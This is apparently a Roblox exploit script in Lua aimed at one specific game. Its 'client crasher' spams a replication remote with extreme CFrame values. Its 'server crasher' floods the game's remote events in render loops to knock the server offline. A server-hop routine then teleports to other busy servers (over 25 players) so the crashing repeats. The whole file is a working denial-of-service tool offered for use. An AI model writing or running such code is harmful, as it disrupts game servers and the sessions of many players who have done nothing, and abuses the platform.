local Target_To_Crash = "server"
local Bot = true
if game.PlaceId == 9528010 then
	local loop = game:GetService("RunService").RenderStepped
	local Crashed = false
	local function Hop()
		local AllIDs = {}
		local foundAnything = ""
		local actualHour = os.date("!*t").hour
		local Deleted = false
		local S_T = game:GetService("TeleportService")
		local S_H = game:GetService("HttpService")
		local loop = game:GetService("RunService").RenderStepped
		local File = pcall(function()
			AllIDs = S_H:JSONDecode(readfile("server-hop-temp.json"))
		end)
		if not File then
			table.insert(AllIDs, actualHour)
			pcall(function()
				writefile("server-hop-temp.json", S_H:JSONEncode(AllIDs))
			end)
		end
		local Found = false
		local function TPReturner(placeId)
			local Site;
			if foundAnything == "" then
				Site = S_H:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. placeId .. '/servers/Public?sortOrder=Asc&limit=100'))
			else
				Site = S_H:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. placeId .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
			end
			local ID = ""
			if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
				foundAnything = Site.nextPageCursor
			end
			local num = 0;
			for i,v in pairs(Site.data) do
				if Found == true then
					break
				end
				local Possible = true
				ID = tostring(v.id)
				if not table.find(AllIDs,tostring(v.id)) then
					if tonumber(v.maxPlayers) > tonumber(v.playing) and tonumber(v.playing) > 25 then
						for _,Existing in pairs(AllIDs) do
							if num ~= 0 then
								if ID == tostring(Existing) then
									Possible = false
								end
							end
							num = num + 1
						end
						if Possible == true then
							table.insert(AllIDs,tostring(game.JobId))
							pcall(function()
								writefile("server-hop-temp.json", S_H:JSONEncode(AllIDs))
								S_T:TeleportToPlaceInstance(placeId, ID, game.Players.LocalPlayer)
								Found = true
							end)
							loop:Wait()
						end
					end
				end
			end
		end
		local module = {}
		function module:Teleport(placeId)
			while true do
				pcall(function()
					TPReturner(placeId)
					if foundAnything ~= "" then
						TPReturner(placeId)
					end
				end)
				loop:Wait()
			end	
		end
		return module
	end
	--[[
	CLIENT CRASHER
	]]
	local function Bot()
		local rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
			if child.Name == 'ErrorPrompt' then 
				child:WaitForChild('MessageArea')  
				child.MessageArea:WaitForChild("ErrorFrame");
				Crashed = true
				Hop():Teleport(game.PlaceId)
			end
		end)
	end
	local function ClientCrasher()
		local L = 1000000000000
		local ohString2 = "C1"
		local ohCFrame3 =CFrame.new(L,L,L,L,L,L,L)
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
			char:WaitForChild("Torso");
			for i = 1,800 do
				local ohInstance1 = workspace[game.Players.LocalPlayer.Name].Torso.TorsoJoint
				game:GetService("ReplicatedStorage").SelectiveReplication.UpdateObject:FireServer(ohInstance1, ohString2, ohCFrame3)
				loop:Wait()
			end
		end)
	end
	--[[
	SERVER CRASHER
	]]
	local function ServerCrasher()
		local T = 0
		local function a()
			local C1 
			C1 = loop:Connect(function()
				if Crashed then
					C1:Disconnect()
				end
				for i = 1,900,1 do
					if Crashed then 
						break
					end
					if i/90 == math.round(i/90) then
						wait()
					end 	
					game:GetService("ReplicatedStorage").Requests.RequestJoinNationOne:InvokeServer()
					game:GetService("ReplicatedStorage").Requests.RequestJoinNationTwo:InvokeServer()	
					game:GetService("ReplicatedStorage").Requests.RequestJoinNationOne:InvokeServer()
					game:GetService("ReplicatedStorage").Requests.RequestJoinNationTwo:InvokeServer()
				end
			end)
		end
		local function b()
			local C1 
			C1 = loop:Connect(function()
				if Crashed then
					C1:Disconnect()
				end
				for i = 1,900,1 do
					if Crashed then 
						break
					end
					if i/20 == math.round(i/20) then
						wait()
					end 
					game:GetService("ReplicatedStorage").Requests.RequestMainMenuGUI:FireServer()
					game:GetService("ReplicatedStorage").Requests.RequestNationSelectionGUI:FireServer()	
					game:GetService("ReplicatedStorage").Requests.RequestMainMenuGUI:FireServer()
					game:GetService("ReplicatedStorage").Requests.RequestCreditsGUI:FireServer()
				end
			end)
		end
		a()b()
		if Bot then
			Bot()
		end
	end
	if string.lower(Target_To_Crash) == "client" then
		ClientCrasher()
	elseif string.lower(Target_To_Crash) == "server" then
		ServerCrasher()
	end
end
